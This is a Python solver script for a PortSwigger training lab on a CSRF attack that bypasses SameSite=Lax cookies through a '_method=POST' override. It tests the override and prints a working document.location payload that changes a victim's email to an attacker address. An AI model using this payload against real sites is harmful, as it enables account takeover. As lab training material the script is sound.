# Lab 07 — SameSite Lax bypass via method override
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
#
# Vulnerability: Session cookie has no SameSite attribute (Chrome defaults to Lax)
#                + server supports _method=POST query parameter to override HTTP method
# Aim:           Change victim's email using a GET request that the server treats as POST
#
# Technique:
#   SameSite=Lax blocks cross-site POST but allows cross-site GET (top-level nav).
#   The framework accepts ?_method=POST on a GET request and treats it as POST server-side.
#
#   So: send a GET with _method=POST
#     → browser sees GET → Lax cookie IS sent (top-level nav)
#     → server sees POST (method override) → processes the email change
#
#   This script:
#     1. Confirms the Lax default (no SameSite in Set-Cookie)
#     2. Confirms _method=POST override works by testing as wiener
#     3. Prints a document.location exploit for victim delivery
#
#   📝 document.location triggers a top-level navigation — exactly the kind
#      of GET request that Lax SameSite permits cookies on. A fetch() or XHR
#      would NOT send Lax cookies cross-site (background request, not top-level).
#
# Usage: python csrf_lab07.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        get_csrf_from_response, check_email_changed,
                        print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_EMAIL   = "wiener-changed@evil.com"
VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 07 — CSRF: SameSite LAX BYPASS VIA METHOD OVERRIDE")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab07.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: check SameSite attribute on session cookie ───────────────────
    print("\n  ── Step 1: check SameSite attribute on the session cookie\n")
    login_page = session.get(f"{url}/login")
    # Perform login to get the session cookie issued
    csrf = get_csrf_from_response(login_page.text)
    r_login = session.post(
        f"{url}/login",
        data={"csrf": csrf, "username": "wiener", "password": "peter"},
        allow_redirects=False   # capture the Set-Cookie header before redirect
    )
    set_cookie = r_login.headers.get("Set-Cookie", "")
    print(f"  Set-Cookie header: {set_cookie}")
    if "SameSite" not in set_cookie:
        print("  ✔  No SameSite attribute → Chrome defaults to Lax")
    elif "Lax" in set_cookie:
        print("  ✔  Explicit SameSite=Lax")
    else:
        print(f"  ℹ  SameSite present: {set_cookie}")

    # ── Step 2: confirm GET + _method=POST override works ────────────────────
    print("\n  ── Step 2: test GET with _method=POST override\n")
    r = session.get(
        f"{url}/my-account/change-email",
        params={"email": TEST_EMAIL, "_method": "POST"},
        allow_redirects=True
    )
    check_email_changed(r.text, TEST_EMAIL)

    # ── Step 3: print exploit ────────────────────────────────────────────────
    section("Step 3: Exploit HTML for the exploit server")

    exploit = f"""\
<script>
document.location = '{url}/my-account/change-email?email={VICTIM_EMAIL}&_method=POST';
</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  Browser sends a GET (Lax cookie allowed on top-level nav).")
    print("     Server sees _method=POST → treats it as a POST → changes email.")
    print("     Lax protection bypassed via method override.")
